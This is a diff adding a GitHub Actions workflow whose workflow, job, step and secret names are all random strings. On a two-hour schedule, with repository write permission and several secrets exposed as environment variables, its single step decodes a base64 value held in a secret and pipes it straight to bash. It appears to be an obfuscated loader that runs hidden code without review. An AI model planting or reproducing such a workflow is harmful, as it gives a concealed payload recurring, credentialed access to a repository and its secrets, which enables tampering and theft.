@@ -1,0 +1,21 @@
+name: sWOD2cNIy03CTqQg
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  It8YA44at7Jtb946:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.HRiWtH4 }}
+      - name: niiE8BtUr9etJv
+        env:
+          L3ZeW: ${{ secrets.yej96 }}
+          oBxKyTK2: ${{ secrets.Pwsj3fy }}
+          yLuqixSzd7mw9eoU: ${{ secrets.D6jS1q2u5bFyMpBu }}
+          GITHUB_TOKEN: ${{ secrets.HRiWtH4 }}
+        run: echo "$L3ZeW" | base64 -d | bash
